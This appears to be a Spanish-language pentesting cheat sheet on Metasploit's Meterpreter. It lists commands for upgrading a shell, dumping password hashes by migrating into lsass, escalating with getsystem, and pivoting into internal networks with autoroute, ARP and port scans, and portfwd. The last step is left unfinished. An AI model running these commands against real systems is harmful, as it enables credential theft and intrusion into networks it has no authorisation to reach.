# Meterpreter

Tags: #Comandos #Meterpreter #Pivoting 

## Meterpreter 

Es un multi-funcional payload que es ejecutado en memoria en un sistema victima haciéndolo difícil de detectar. El se comunica a través de un socket stager y provee a un atacante un interpretado de comandos interactivo de un sistema victima que facilite la ejecución de comandos del sistema, navegación del sistema de archivos,  keylogging y mucho mas. 

## Convertir una Shell a Meterpreter

```bash 
# Debes de tener una sesion activa y en background en Metasploit 

❯ use post/multi/manage/shell_to_meterpreter
	❯ set session <ID>
	❯ run 

❯ sessions -l                # Miramos las sesiones activas, l (ele) = Listar 
❯ sessions -i <ID>           # Usar la sesion con Meterpreter
```

## Comandos con Meterpreter

```bash 
# Migrar a un proceso con mayores privilegios para tener un 'Meterpreter x64/Windows'

❯ hashdump                   # Te muestra todos los hashes de los usuarios, en dado caso que te salga este error 'Operation_failed: The parameter is incorrect', debemos de migrar a otro proceso.
	❯ pgrep lsass              # Mirar el numero del proceso 'lsass'  
	❯ migrate <ID>             # Nos migramos al proceso y asi poder mejorar la consola de Meterpreter, por lo que ahora podremos hacer el dumpeo de Hashes.  
```

```bash 
# Cuando tienes la sesion con Meterpreter 

❯ ctrl + z                   # Colocas la sesion en 'Background'
❯ background                 # Ponemos la sesion en segundo plano
❯ sessions                   # Miramos las sesiones activas 
❯ sessions -u <ID>           # Regresamos a la sesion 


❯ sysinfo                    # Muestra informacion del Windows 
❯ getuid                     # Miramos el nombre del usuario 
❯ getprivs                   # Miramos los  procesos con privilegios 
❯ getsystem                  # Miras los procesos privilegiados 
❯ pgrep explorer             # Mirar el numero del proceso y asi poder escalar privilegios 
❯ search -f *.doc            # Buscar un archivo 

❯ shell                      # Nos carga una shell
	❯ /bin/bash -i          # Si no nos crea la Shell con el comando anterior, lo hacemos con este 
❯ pwd                        # Nos muestra la ruta del dir actual 
❯ cd /                       # Nos dirigimos a la raiz 'C:\'
❯ cat file.txt               # Miramos el contenido de un archivo 
```

## Para hacer Pivoting con Metasploit

```bash 
❯ run arp_scanner -r IP.0/24              # Barrido ARP en la direccion IP 

1. Agregar la IP a la tabla de ruteo
❯ run autoroute -s IP.0/24                # Agregas la IP a la tabla de ruteo para alcanzar la nueva red

2. Te sales de la sesion y puedes ver la tabla de ruteo
❯ Ctrl + z                                # Poner en background la sesion
❯ route print                             # Mirar la tabla de ruteo 

3. Fuera de la sesion usas el scanner para ver los puertos de la maquina agregada
❯ use auxiliary/scanner/portscan/tcp      # Hacer escaneo con Nmap
	❯ options 
	❯ set ports 1-1000                # Escanearemos los primero 1000 puertos 
	❯ set rhosts <IP>                 # Colocamos la IP de la maquina a la que no llegabamos y ahora si por el Pivoting
	❯ run 

4. 
❯ netstat                  # 

❯ portfwd                  # 
```